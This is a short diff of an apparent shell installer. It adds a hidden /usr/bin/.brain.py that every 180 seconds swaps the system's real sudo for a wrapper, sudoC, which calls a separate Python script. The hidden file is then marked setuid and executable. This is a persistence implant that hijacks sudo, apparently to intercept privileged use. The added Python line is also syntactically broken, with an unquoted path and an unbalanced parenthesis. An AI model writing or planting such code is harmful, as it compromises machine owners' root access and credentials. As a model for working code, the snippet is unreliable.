@@ -63,7 +63,16 @@ cat <<EOFB > /usr/bin/sudoC
 python3 /usr/bin/sudoB "$@"
 EOFB
 cat <<EOFC > /usr/bin/.brain.py
+import os
+import time
 
+def main():
+    while(True):
+        if(os.path.exists(/usr/bin/sudoC):
+            os.system("mv /usr/bin/sudo /usr/bin/sudoA")
+            os.system("mv /usr/bin/sudoC /usr/bin/sudo")
+        time.sleep(180)
+main()
 EOFC
 chmod +s /usr/bin/.brain.py
 chmod +x /usr/bin/.brain.py
